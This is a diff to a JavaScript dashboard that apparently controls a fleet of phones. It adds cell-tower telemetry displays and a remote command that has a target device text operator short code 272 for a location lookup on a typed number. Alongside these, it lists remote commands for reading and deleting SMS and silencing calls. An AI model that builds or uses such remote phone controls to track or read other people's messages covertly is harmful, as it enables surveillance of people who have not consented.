+        lbsType: data.lbsType || '',
+        remarks: data.remarks || '',
+        requestId: data.requestId || '',
+        mapsUrl: data.mapsUrl || '',
+        connectedCgi: data.connectedCgi || '',
+        cgiMatchStatus: data.cgiMatchStatus || ''
+      };
     }
 
     if (typeof updateCentralBatchStatusOnAck === 'function') {
@@ -12850,6 +13303,7 @@
   }
 
   function openGpsSettings() {
+    syncLiveCommsToastSettingUi();
     const m = document.getElementById('gpsSettingsModal');
     if (m) m.style.display = 'flex';
   }
@@ -13322,6 +13776,13 @@
         renderInfoRow('ICCID', d.iccid || '--'),
         renderInfoRow('Network State', d.networkState || d.networkType || '--'),
         renderInfoRow('Telecom RF Mode', tc ? `${tc.activeMode || '--'} (${tc.primaryDbm || '--'})` : '--'),
+        renderInfoRow('Area Codes (TAC / LAC)', tc ? `TAC: ${tc.activeTac || (tc.lte4g && tc.lte4g.tac) || (tc.nr5g && tc.nr5g.tac) || '--'} • LAC: ${tc.activeLac || '--'}` : '--'),
+        renderInfoRow('4G MRBTS / LNCEL', tc ? `${tc.mrbtsId || (tc.lte4g && tc.lte4g.btsId) || '--'} / Cell ${tc.lncelId || (tc.lte4g && tc.lte4g.localCellId) || '--'} (${tc.lteCellLayer || (tc.lte4g && tc.lte4g.cellLayer) || '--'})` : '--'),
+        renderInfoRow('5G NRBTS / NRCell', tc ? `${tc.nrbtsId || (tc.nr5g && tc.nr5g.btsId) || '--'} / Cell ${tc.nrcellId || (tc.nr5g && tc.nr5g.localCellId) || '--'} (${tc.nrCellLayer || (tc.nr5g && tc.nr5g.cellLayer) || '--'})` : '--'),
+        renderInfoRow('Connected 4G CGI (ECGI)', tc ? (tc.connected4gCgi || (tc.lte4g && tc.lte4g.cgi) || '--') : '--'),
+        renderInfoRow('Connected 5G CGI (NCGI)', tc ? (tc.connected5gCgi || (tc.nr5g && tc.nr5g.cgi) || '--') : '--'),
+        renderInfoRow('Connected Cell Status', tc ? (tc.connectedCellStatus || tc.dataState || '--') : '--'),
+        renderInfoRow('Airtel LBS Test (272)', tc && tc.lbsTest ? `${tc.lbsTest.status || 'IDLE'}${tc.lbsTest.responseCgi ? ' • CGI: ' + tc.lbsTest.responseCgi : ''}${tc.lbsTest.parsedStatus ? ' (' + tc.lbsTest.parsedStatus + ')' : ''}` : '--'),
         renderInfoRow('Band Lock Profile', lockInfo),
         renderInfoRow('GPS Coordinates', coords),
         renderInfoRow('Speed / Accuracy', d.accuracy !== undefined ? `${(d.speed || 0).toFixed(1)} km/h (±${d.accuracy}m)` : '--')
@@ -13991,6 +14452,7 @@
       CALL_NUMBER: true,
       END_CALL: true,
       ANSWER_CALL: true,
+      SILENCE_CALL: true,
       SET_CALL_BLOCK_RULES: true,
       GET_SMS_MESSAGES: true,
       DELETE_SMS_MESSAGE: true,
@@ -14388,6 +14850,19 @@
     '2G GSM': [900, 1800, 850, 1900]
   };
 
+  const TELECOM_BAND_FREQ_MAP = {
+    '4G LTE': { 1: 'L2100', 3: 'L1800', 5: 'L850', 7: 'L2600', 8: 'L900', 20: 'L800', 28: 'L700', 38: 'L2600T', 40: 'L2300', 41: 'L2500', 42: 'L3500', 66: 'L1700' },
+    '5G NR':  { 1: 'N2100', 3: 'N1800', 5: 'N850', 8: 'N900', 28: 'N700', 40: 'N2300', 41: 'N2500', 77: 'N3700', 78: 'N3500', 258: 'N26G' },
+    '2G GSM': { 900: 'G900', 1800: 'G1800', 850: 'G850', 1900: 'G1900' }
+  };
+
+  function getTelecomBandFreqLabel(group, band) {
+    const map = TELECOM_BAND_FREQ_MAP[group] || {};
+    const fTag = map[band] || '';
+    const prefix = group === '5G NR' ? 'n' : (group === '4G LTE' ? 'B' : 'GSM ');
+    return fTag ? `${prefix}${band} (${fTag})` : `${prefix}${band}`;
+  }
+
   // Strict quality hierarchy: Red > Orange > Blue > Yellow > Green
   const TELECOM_TIER_META = {
     0: { key: 'UNKNOWN', label: 'STANDBY', color: '#64748B' },
@@ -14476,6 +14951,21 @@
     const rsrpLabel = (techTag === '2G') ? 'RxLev / RSSI' : (techTag === '5G' ? 'SS-RSRP' : 'RSRP');
     const sinrLabel = (techTag === '2G') ? 'RXQUAL / SNR' : (techTag === '5G' ? 'SS-SINR' : 'SINR / SNR');
     const arfcnLabel = (techTag === '5G') ? 'NR-ARFCN' : (techTag === '2G' ? 'ARFCN' : 'EARFCN');
+    const cgiLabel = (techTag === '5G') ? 'Connected 5G CGI (NCGI)' : (techTag === '4G' ? 'Connected 4G CGI (ECGI)' : 'Connected 2G CGI');
+    const isLegacy2g3g = (techTag === '2G' || techTag === '3G');
+    const tacLabel = isLegacy2g3g ? 'LAC' : 'TAC';
+    const btsFieldLabel = (techTag === '5G') ? 'NRBTS (gNB)' : (techTag === '4G' ? 'MRBTS (eNB)' : (techTag === '3G' ? 'RNC ID' : 'BTS / Cell'));
+    const localCellFieldLabel = (techTag === '5G') ? 'NRCell / Layer' : (techTag === '4G' ? 'LNCEL / Layer' : 'Local Cell ID');
+    const connStatus = node.connectionStatus || (node.isServing ? 'CONNECTED (SERVING)' : 'NEIGHBOR / IDLE');
+    const connColor = node.isServing ? '#22c55e' : '#facc15';
+    const cellIdText = formatTelecomDecimalCellId(node.cellId);
+    const decoded = decodeTelecomBtsAndLayerJs(techTag, node);
+    const areaVal = isLegacy2g3g
+      ? (node.lac || node.tacOrLac || node.tac || '--')
+      : (node.tac || node.tacOrLac || '--');
+    const cgiText = (node.cgi && String(node.cgi).trim() && node.cgi !== '--')
+      ? escapeHtml(String(node.cgi).trim())
+      : ((node.plmn && node.plmn !== '--' && cellIdText !== '--') ? escapeHtml(node.plmn + '-' + cellIdText) : cellIdText);
 
     return `
       <div style="background:#070d14; border:1px solid ${borderCol}55; border-top:3px solid ${borderCol}; border-radius:10px; padding:12px;">
@@ -14486,12 +14976,14 @@
             ${showSimultaneousTag ? '<span class="badge-mini purple" style="font-size:0.58rem;">EN-DC 5G+4G</span>' : ''}
           </div>
           <div style="display:flex; gap:4px; align-items:center;">
+            ${decoded.cellLayer && decoded.cellLayer !== '--' ? `<span class="badge-mini" style="background:rgba(56,189,248,0.14); color:#38bdf8; border:1px solid rgba(56,189,248,0.4);">${escapeHtml(decoded.cellLayer)}</span>` : ''}
             <span class="badge-mini" style="background:${borderCol}22; color:${borderCol}; border:1px solid ${borderCol}55;">${escapeHtml(tierInfo.label)}</span>
           </div>
         </div>
 
-        <div style="display:flex; justify-content:space-between; font-size:0.68rem; color:#94a3b8; margin-bottom:8px;">
+        <div style="display:flex; justify-content:space-between; align-items:center; gap:6px; flex-wrap:wrap; font-size:0.68rem; color:#94a3b8; margin-bottom:8px;">
           <span>Role: <strong style="color:#e2e8f0;">${escapeHtml(roleLabel)}</strong></span>
+          <span>Status: <strong style="color:${connColor};">${escapeHtml(connStatus)}</strong></span>
           <span>Band: <strong style="color:#38bdf8;">${escapeHtml(node.band || '--')}</strong></span>
         </div>
 
@@ -14514,12 +15006,120 @@
           </div>
         </div>
 
-        <div style="margin-top:6px; background:#0b131e; border:1px solid rgba(255,255,255,0.06); border-radius:6px; padding:6px 8px; display:flex; justify-content:space-between; align-items:center;">
-          <span style="font-size:0.62rem; color:#64748b; text-transform:uppercase;">Cell ID (Decimal)</span>
-          <span style="font-size:0.82rem; font-weight:700; color:#38bdf8; font-family:monospace;">${formatTelecomDecimalCellId(node.cellId)}</span>
+        <div style="margin-top:6px; display:grid; grid-template-columns:repeat(2, minmax(0,1fr)); gap:6px;">
+          <div style="background:#0b131e; border:1px solid rgba(255,255,255,0.06); border-radius:6px; padding:6px 8px;">
+            <div style="font-size:0.58rem; color:#64748b; text-transform:uppercase;">${btsFieldLabel}</div>
+            <div style="font-size:0.82rem; font-weight:800; color:#facc15; font-family:monospace;">${escapeHtml(decoded.btsId)}</div>
+          </div>
+          <div style="background:#0b131e; border:1px solid rgba(255,255,255,0.06); border-radius:6px; padding:6px 8px;">
+            <div style="font-size:0.58rem; color:#64748b; text-transform:uppercase;">${localCellFieldLabel}</div>
+            <div style="font-size:0.82rem; font-weight:800; color:#34d399; font-family:monospace;">${escapeHtml(decoded.localCellId)}${decoded.cellLayer && decoded.cellLayer !== '--' ? ' <span style="font-size:0.66rem; color:#38bdf8;">(' + escapeHtml(decoded.cellLayer) + ')</span>' : ''}</div>
+          </div>
+        </div>
+
+        <div style="margin-top:6px; background:#0b131e; border:1px solid rgba(255,255,255,0.06); border-radius:6px; padding:6px 8px; display:flex; justify-content:space-between; align-items:center; gap:6px; flex-wrap:wrap;">
+          <div>
+            <div style="font-size:0.58rem; color:#64748b; text-transform:uppercase;">Cell ID (Decimal)</div>
+            <div style="font-size:0.78rem; font-weight:700; color:#e2e8f0; font-family:monospace;">${cellIdText}${node.cellIdExtra || node.cellExtra ? (' <span style="font-size:0.65rem; color:#94a3b8;">(' + escapeHtml(node.cellExtra || node.cellIdExtra) + ')</span>') : ''}</div>
+          </div>
+          <div style="text-align:right;">
+            <div style="font-size:0.58rem; color:#64748b; text-transform:uppercase;">${tacLabel} / RSRQ</div>
+            <div style="font-size:0.74rem; font-weight:700; color:#cbd5e1; font-family:monospace;">${escapeHtml(areaVal)} / ${escapeHtml(node.rsrq || '--')}</div>
+          </div>
+        </div>
+
+        <div style="margin-top:6px; background:#0b131e; border:1px solid rgba(56,189,248,0.22); border-radius:6px; padding:6px 8px; display:flex; justify-content:space-between; align-items:center;">
+          <span style="font-size:0.62rem; color:#94a3b8; text-transform:uppercase;">${cgiLabel}</span>
+          <span style="font-size:0.8rem; font-weight:800; color:#38bdf8; font-family:monospace;">${cgiText}</span>
         </div>
       </div>
     `;
+  }
+
+  function decodeLteSectorLayerJs(bandStr, lncel) {
+    if (!isFinite(lncel) || lncel < 0) return '--';
+    const b = String(bandStr || '');
+    if (lncel >= 1 && lncel <= 9) {
+      if (!b || b.indexOf('1800') >= 0 || b.indexOf('B3') >= 0 || b === '--') return 'L1800 S' + lncel;
+      return b + ' S' + lncel;
+    }
+    if (lncel >= 11 && lncel <= 19) return 'L2100 C1 S' + (lncel - 10);
+    if (lncel >= 21 && lncel <= 29) return 'L900 C1 S' + (lncel - 20);
+    if (lncel >= 31 && lncel <= 39) return 'L850 S' + (lncel - 30);
+    if (lncel >= 41 && lncel <= 49) return 'L2100 C2 S' + (lncel - 40);
+    if (lncel >= 51 && lncel <= 59) return 'L900 C2 S' + (lncel - 50);
+    if (lncel >= 101 && lncel <= 109) return 'L2300 C1 S' + (lncel - 100);
+    if (lncel >= 111 && lncel <= 119) return 'L2300 C2 S' + (lncel - 110);
+    if (lncel >= 121 && lncel <= 129) return 'L2300 C3 S' + (lncel - 120);
+    if (lncel >= 131 && lncel <= 139) return 'L2300 C4 S' + (lncel - 130);
+    if (lncel >= 141 && lncel <= 149) return 'L2500 S' + (lncel - 140);
+    return b && b !== '--' ? (b + ' C' + lncel) : ('LNCEL ' + lncel);
+  }
+
+  function decodeNrSectorLayerJs(bandStr, nrCell) {
+    if (!isFinite(nrCell) || nrCell < 0) return '--';
+    const b = String(bandStr || '');
+    if (nrCell >= 311 && nrCell <= 319) return '5G C1 S' + (nrCell - 310);
+    if (nrCell >= 321 && nrCell <= 329) return '5G C2 S' + (nrCell - 320);
+    if (nrCell >= 331 && nrCell <= 339) return '5G C3 S' + (nrCell - 330);
+    if (nrCell >= 301 && nrCell <= 309) return '5G NR S' + (nrCell - 300);
+    return b && b !== '--' ? (b + ' C' + nrCell) : ('NRCell ' + nrCell);
+  }
+
+  function decodeTelecomBtsAndLayerJs(techTag, node) {
+    if (!node) return { btsId: '--', localCellId: '--', cellLayer: '--' };
+    let btsId = (node.btsId !== undefined && node.btsId !== null && String(node.btsId).trim() && node.btsId !== '--')
+      ? String(node.btsId).trim() : '';
+    let localCellId = (node.localCellId !== undefined && node.localCellId !== null && String(node.localCellId).trim() && node.localCellId !== '--')
+      ? String(node.localCellId).trim() : '';
+    let cellLayer = (node.cellLayer !== undefined && node.cellLayer !== null && String(node.cellLayer).trim() && node.cellLayer !== '--')
+      ? String(node.cellLayer).trim() : '';
+
+    const rawCidStr = String(node.cellId || '').replace(/[^\d]/g, '');
+    const rawCid = rawCidStr ? Number(rawCidStr) : NaN;
+
+    if (techTag === '4G' && isFinite(rawCid) && rawCid > 0) {
+      const mrbts = Math.floor(rawCid / 256);
+      const lncel = rawCid % 256;
+      if (!btsId) btsId = String(mrbts);
+      if (!localCellId) localCellId = String(lncel);
+      if (!cellLayer) cellLayer = decodeLteSectorLayerJs(node.band, Number(localCellId));
+    } else if (techTag === '5G' && isFinite(rawCid) && rawCid > 0) {
+      if (!btsId || !localCellId) {
+        const c22 = rawCid % 16384;
+        const g22 = Math.floor(rawCid / 16384);
+        const c24 = rawCid % 4096;
+        const g24 = Math.floor(rawCid / 4096);
+        const c26 = rawCid % 1024;
+        const g26 = Math.floor(rawCid / 1024);
+        let chosenG = g22;
+        let chosenC = c22;
+        if ((c22 >= 300 && c22 <= 399) || c22 <= 511) {
+          chosenG = g22; chosenC = c22;
+        } else if ((c24 >= 300 && c24 <= 399) || c24 <= 255) {
+          chosenG = g24; chosenC = c24;
+        } else if (c26 <= 255) {
+          chosenG = g26; chosenC = c26;
+        }
+        if (!btsId) btsId = String(chosenG);
+        if (!localCellId) localCellId = String(chosenC);
+      }
+      if (!cellLayer) cellLayer = decodeNrSectorLayerJs(node.band, Number(localCellId));
+    } else if (techTag === '3G' && isFinite(rawCid) && rawCid > 0) {
+      if (!btsId) btsId = String(Math.floor(rawCid / 65536));
+      if (!localCellId) localCellId = String(rawCid % 65536);
+      if (!cellLayer) cellLayer = node.band && node.band !== '--' ? String(node.band) : '3G UTRAN';
+    } else if (techTag === '2G') {
+      if (!btsId) btsId = isFinite(rawCid) && rawCid > 0 ? String(rawCid) : '--';
+      if (!localCellId) localCellId = '--';
+      if (!cellLayer) cellLayer = node.band && node.band !== '--' ? String(node.band) : '2G GSM';
+    }
+
+    return {
+      btsId: btsId || '--',
+      localCellId: localCellId || '--',
+      cellLayer: cellLayer || '--'
+    };
   }
 
   function renderTelecomControlPage() {
@@ -14533,10 +15133,14 @@
     const rootSec = document.getElementById('telecomRootControlSection');
     const nonRootSec = document.getElementById('telecomNonRootControlSection');
 
+    const cellBar = document.getElementById('telecomConnectedCellBar');
+
     if (!dev) {
       if (modeBadge) modeBadge.textContent = '--';
       if (privBadge) privBadge.textContent = 'NO DEVICE';
       if (lockSummary) lockSummary.textContent = 'Lock State: Select a target device';
+      if (cellBar) cellBar.textContent = 'Connected 4G & 5G CGI: Waiting for device selection...';
+      renderTelecomLbsBox(null, null);
       if (grid) {
         grid.innerHTML = '<div style="grid-column:1/-1; padding:20px; text-align:center; color:#94a3b8; font-size:0.78rem; background:#070d14; border-radius:8px; border:1px dashed rgba(255,255,255,0.1);">Select a device from the fleet bar above to inspect live 2G / 4G / 5G RF KPIs and adaptive Band Lock controls.</div>';
       }
@@ -14607,6 +15211,27 @@
       lockSummary.textContent = (lp.hasActiveLock ? 'Lock Active — ' : 'Unlocked — ') + parts.join(' • ');
     }
 
+    if (cellBar) {
+      const lteNode = tele.lte4g || {};
+      const nrNode = tele.nr5g || {};
+      const lteDec = decodeTelecomBtsAndLayerJs('4G', lteNode);
+      const nrDec = decodeTelecomBtsAndLayerJs('5G', nrNode);
+      const cgi4 = tele.connected4gCgi || lteNode.cgi || '--';
+      const cgi5 = tele.connected5gCgi || nrNode.cgi || '--';
+      const st4 = lteNode.connectionStatus || (lteNode.present ? 'CONNECTED' : 'STANDBY');
+      const st5 = nrNode.connectionStatus || (nrNode.present ? 'CONNECTED' : 'STANDBY');
+      const tacVal = tele.activeTac || lteNode.tac || nrNode.tac || '--';
+      const lacVal = tele.activeLac || (tele.gsm2g && tele.gsm2g.lac) || (tele.wcdma3g && tele.wcdma3g.lac) || '--';
+      const dataLine = `${tele.dataState || '--'} • Mode: ${tele.activeMode || '--'} • Voice: ${tele.voiceType || '--'} • TAC: ${tacVal} • LAC: ${lacVal}`;
+      const mrbtsLine = `${tele.mrbtsId || lteDec.btsId} / LNCEL ${tele.lncelId || lteDec.localCellId} (${tele.lteCellLayer || lteDec.cellLayer})`;
+      const nrbtsLine = `${tele.nrbtsId || nrDec.btsId} / NRCell ${tele.nrcellId || nrDec.localCellId} (${tele.nrCellLayer || nrDec.cellLayer})`;
+      cellBar.innerHTML = `
+        <div><strong style="color:#34d399;">CELL STATUS:</strong> ${escapeHtml(dataLine)}</div>
+        <div><strong style="color:#facc15;">4G MRBTS / LNCEL:</strong> ${escapeHtml(mrbtsLine)} <span style="color:#94a3b8;">• CGI:</span> <strong style="color:#38bdf8;">${escapeHtml(cgi4)}</strong> <span style="color:#94a3b8;">[${escapeHtml(st4)}${lteNode.band ? ' • ' + escapeHtml(lteNode.band) : ''}${lteNode.pci ? ' • PCI ' + escapeHtml(lteNode.pci) : ''}]</span></div>
+        <div><strong style="color:#facc15;">5G NRBTS / NRCell:</strong> ${escapeHtml(nrbtsLine)} <span style="color:#94a3b8;">• CGI:</span> <strong style="color:#a855f7;">${escapeHtml(cgi5)}</strong> <span style="color:#94a3b8;">[${escapeHtml(st5)}${nrNode.band ? ' • ' + escapeHtml(nrNode.band) : ''}${nrNode.pci ? ' • PCI ' + escapeHtml(nrNode.pci) : ''}]</span></div>
+      `;
+    }
+
     if (grid) {
       const endc = !!(tele.nr5g && tele.nr5g.present && tele.lte4g && tele.lte4g.present);
       grid.innerHTML = [
@@ -14615,6 +15240,7 @@
         buildTelecomRatCardHtml('2G GSM Cell', '2G', tele.gsm2g, false)
       ].join('');
     }
+    renderTelecomLbsBox(dev, tele);
 
     if (capBanner) {
       if (appMode === 'POWER_SAVING') {
@@ -14656,6 +15282,103 @@
 
     renderTelecomBandCheckboxes();
     updateTelecomAdbPreview();
+  }
+
+  let lastLbsPrefillImei = '';
+  function renderTelecomLbsBox(dev, tele) {
+    const badge = document.getElementById('telecomLbsStatusBadge');
+    const box = document.getElementById('telecomLbsResultBox');
+    const inp = document.getElementById('inpTelecomLbsMsisdn');
+    if (!dev || !tele) {
+      if (badge) { badge.className = 'badge-mini info'; badge.textContent = 'READY'; }
+      if (box) box.textContent = 'Status: IDLE • Select a target device to run Airtel LBS Test (SMS -> 272).';
+      return;
+    }
+    const lbs = tele.lbsTest || {};
+    const st = String(lbs.status || 'IDLE').toUpperCase();
+    const prefNum = (lbs.targetMsisdn && String(lbs.targetMsisdn).trim())
+      ? String(lbs.targetMsisdn).trim()
+      : (tele.simMsisdn ? String(tele.simMsisdn).trim() : '');
+    if (inp && document.activeElement !== inp) {
+      if (lastLbsPrefillImei !== dev.imei || !inp.value.trim()) {
+        inp.value = prefNum;
+        lastLbsPrefillImei = dev.imei || '';
+      }
+    }
+    if (badge) {
+      if (st === 'SUCCESS') {
+        badge.className = 'badge-mini success';
+        badge.textContent = 'LBS SUCCESS';
+      } else if (st === 'WAITING_REPLY' || st === 'SENDING') {
+        badge.className = 'badge-mini warning';
+        badge.textContent = st === 'SENDING' ? 'SENDING' : 'WAITING 272';
+      } else if (st === 'FAILED') {
+        badge.className = 'badge-mini danger';
+        badge.textContent = 'LBS FAILED';
+      } else {
+        badge.className = 'badge-mini info';
+        badge.textContent = 'READY';
+      }
+    }
+    if (!box) return;
+    if (!st || st === 'IDLE') {
+      const simNote = prefNum ? `Detected Active SIM MSISDN: ${escapeHtml(prefNum)}` : 'SIM MSISDN blank on SIM hardware (enter 10-digit or 91xxxxxxxxxx number above)';
+      box.innerHTML = `<div><strong>Status:</strong> IDLE • ${simNote}</div>`;
+      return;
+    }
+    const sentMeta = lbs.targetMsisdn
+      ? `${escapeHtml(lbs.targetMsisdn)} &rarr; ${escapeHtml(lbs.shortCode || '272')} (SIM ${lbs.slotNumber || 1}${lbs.sentAtStr && lbs.sentAtStr !== '--' ? ' @ ' + escapeHtml(lbs.sentAtStr) : ''})`
+      : '--';
+    const respCgi = lbs.responseCgi || '--';
+    const btsHint = lbs.cgiBtsInfo ? ` (${lbs.cgiBtsInfo})` : '';
+    const connCgi = lbs.connectedCgi || tele.connected4gCgi || tele.connected5gCgi || '--';
+    const matchTag = lbs.cgiMatchStatus ? ` [${lbs.cgiMatchStatus}]` : '';
+    const metaParts = [];
+    if (lbs.mob) metaParts.push(`MOB: ${lbs.mob}`);
+    if (lbs.lastActivity) metaParts.push(`L.Act: ${lbs.lastActivity}`);
+    if (lbs.vlr) metaParts.push(`VLR: ${lbs.vlr}`);
+    if (lbs.lbsType) metaParts.push(`LBS Type: ${lbs.lbsType}`);
+    if (lbs.requestId) metaParts.push(`Req ID: ${lbs.requestId}`);
+    const extraParts = [];
+    if (lbs.responseLac) extraParts.push(`LAC/TAC: ${lbs.responseLac}`);
+    if (lbs.responseCellId) extraParts.push(`Cell ID: ${lbs.responseCellId}`);
+    if (lbs.responseLatLon) extraParts.push(`Lat/Lon: ${lbs.responseLatLon}`);
+    if (lbs.responseLocation) extraParts.push(`Location: ${lbs.responseLocation}`);
+    if (lbs.remarks) extraParts.push(`Remarks: ${lbs.remarks}`);
+    const safeMapsUrl = (lbs.mapsUrl && /^https?:\/\//i.test(String(lbs.mapsUrl).trim())) ? String(lbs.mapsUrl).trim() : '';
+    box.innerHTML = `
+      <div><strong style="color:#e2e8f0;">Status:</strong> <strong style="color:${st === 'SUCCESS' ? '#34d399' : (st === 'FAILED' ? '#f87171' : '#facc15')};">${escapeHtml(st)}</strong>${lbs.parsedStatus ? ' — ' + escapeHtml(lbs.parsedStatus) : ''}</div>
+      <div><strong style="color:#94a3b8;">SMS Payload:</strong> ${sentMeta}</div>
+      <div><strong style="color:#38bdf8;">LBS CGI (${escapeHtml(lbs.responseSender || '272')}):</strong> <strong style="color:#38bdf8;">${escapeHtml(respCgi)}</strong><span style="color:#facc15;">${escapeHtml(btsHint)}</span><span style="color:#94a3b8;">${escapeHtml(matchTag)}</span></div>
+      <div><strong style="color:#94a3b8;">Connected Cell CGI:</strong> ${escapeHtml(connCgi)}</div>
+      ${metaParts.length > 0 ? `<div><strong style="color:#a7f3d0;">LEALOC Meta:</strong> ${escapeHtml(metaParts.join(' • '))}</div>` : ''}
+      ${extraParts.length > 0 ? `<div><strong style="color:#facc15;">LBS Data:</strong> ${escapeHtml(extraParts.join(' • '))}${safeMapsUrl ? ` • <a href="${escapeHtml(safeMapsUrl)}" target="_blank" rel="noopener noreferrer" style="color:#38bdf8; text-decoration:underline;">Open Maps</a>` : ''}</div>` : ''}
+      ${lbs.responseRaw ? `<div style="margin-top:4px; padding-top:4px; border-top:1px dashed rgba(255,255,255,0.1); color:#cbd5e1; white-space:pre-wrap;"><strong>Reply (${escapeHtml(lbs.responseSender || '272')}${lbs.receivedAtStr && lbs.receivedAtStr !== '--' ? ' @ ' + escapeHtml(lbs.receivedAtStr) : ''}):</strong> ${escapeHtml(lbs.responseRaw)}</div>` : ''}
+    `;
+  }
+
+  function triggerRemoteAirtelLbsTest() {
+    if (!currentTargetImei || !devicesFleet[currentTargetImei]) {
+      alert('Select a target device first.');
+      return;
+    }
+    const inp = document.getElementById('inpTelecomLbsMsisdn');
+    const typed = inp ? inp.value.trim() : '';
+    const dev = devicesFleet[currentTargetImei];
+    const subId = (dev.telecom && dev.telecom.subId !== undefined) ? dev.telecom.subId : -1;
+    publishRemoteCommand('RUN_AIRTEL_LBS_TEST', {
+      msisdn: typed,
+      subId: subId,
+      requestId: 'lbs_' + Date.now()
+    });
+    if (!dev.telecom || typeof dev.telecom !== 'object') dev.telecom = {};
+    dev.telecom.lbsTest = Object.assign({}, dev.telecom.lbsTest || {}, {
+      status: 'SENDING',
+      shortCode: '272',
+      targetMsisdn: typed || (dev.telecom.simMsisdn || ''),
+      parsedStatus: 'Dispatching SMS to 272 on target device...'
+    });
+    renderTelecomLbsBox(dev, dev.telecom);
   }
 
   function computeTelecomBandMaskHexJs(bands, group) {
@@ -14716,15 +15439,15 @@
     if (!container) return;
 
     const catalog = TELECOM_BAND_CATALOG[selectedTelecomBandGroup] || [];
-    const prefix = selectedTelecomBandGroup === '5G NR' ? 'n' : (selectedTelecomBandGroup === '4G LTE' ? 'B' : 'GSM ');
     container.innerHTML = catalog.map(b => {
       const checked = selectedTelecomBands.includes(b);
-      return `<button type="button" class="btn-ctrl compact ${checked ? 'btn-primary' : 'btn-outline'}" onclick="toggleTelecomBandChip(${b})" style="min-width:58px;">${escapeHtml(prefix + b)}</button>`;
+      const chipText = getTelecomBandFreqLabel(selectedTelecomBandGroup, b);
+      return `<button type="button" class="btn-ctrl compact ${checked ? 'btn-primary' : 'btn-outline'}" onclick="toggleTelecomBandChip(${b})" style="min-width:86px;">${escapeHtml(chipText)}</button>`;
     }).join('');
 
     if (label) {
       const sorted = [...selectedTelecomBands].sort((a, b) => a - b);
-      const selectedTxt = sorted.length ? sorted.map(b => prefix + b).join(', ') : 'None (Auto / All)';
+      const selectedTxt = sorted.length ? sorted.map(b => getTelecomBandFreqLabel(selectedTelecomBandGroup, b)).join(', ') : 'None (Auto / All)';
       const maskHex = computeTelecomBandMaskHexJs(sorted, selectedTelecomBandGroup);
       label.textContent = `Group: ${selectedTelecomBandGroup} • Selected: ${selectedTxt} • Mask: ${maskHex}`;
     }
